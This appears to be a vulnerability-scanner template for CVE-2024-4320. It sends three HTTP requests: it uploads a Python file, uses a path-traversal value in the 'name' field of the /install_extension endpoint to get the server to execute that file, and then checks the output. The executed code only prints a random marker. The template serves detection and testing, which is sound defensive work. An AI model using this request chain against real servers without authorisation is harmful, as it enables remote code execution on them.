id: fastapi-extension-exploit
info:
  name: FastAPI Extension Exploit
  author: bolkv, gy741, n0ming, DongyoungKim, RoughBoy
  severity: high
  description: |
      CVE-2024-4320: PathTraversal, This vulnerability exists in the @router.post("/install_extension") 
      endpoint, allowing an attacker to manipulate the data.name parameter to execute arbitrary Python
      files via path traversal. By exploiting this, an attacker can upload a malicious __init__.py file 
      to a writable directory, which the server will then load and execute, leading to remote code execution (RCE). 
      The vulnerability arises from the direct concatenation of user input with server paths and the use of importlib.machinery.
      SourceFileLoader to load modules.

requests:
  - raw:
      - |
        POST /uploadfile/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="file"; filename="{{randstr}}.py"
        Content-Type: text/x-python

        print("{{randstr}}")
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

      - |
        POST /install_extension HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "name": "../../../../../../../../../../../path/to/uploads/{{randstr}}.py"
        }

      - |
        GET /uploads/{{randstr}}.py HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
        - "{{randstr}}"

      
